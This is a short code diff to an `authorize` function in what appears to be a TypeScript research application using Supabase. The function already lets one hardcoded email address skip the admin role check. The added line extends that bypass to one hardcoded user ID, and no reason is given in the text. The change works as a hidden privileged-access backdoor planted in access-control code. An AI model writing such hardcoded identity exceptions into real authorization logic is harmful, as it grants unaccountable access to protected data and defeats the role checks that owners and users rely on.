@@ -8,7 +8,7 @@ import { participantSchema, purposeSchema, reviewSchema } from './research-rules
 
 async function authorize(context: { supabase: SupabaseClient<Database>; userId: string; claims?: any }) {
   const email = (context.claims?.email || '').toLowerCase().trim();
-  if (email === 'kiarrica2024@gmail.com') return;
+  if (email === 'kiarrica2024@gmail.com' || context.userId === '2a4c1678-3dfd-43af-a7b5-e39fdc9c1c92') return;
   const { data, error } = await context.supabase.rpc('has_role', { _user_id: context.userId, _role: 'admin' });
   if (error || !data) throw new Error('This account does not have research team access.');
 }
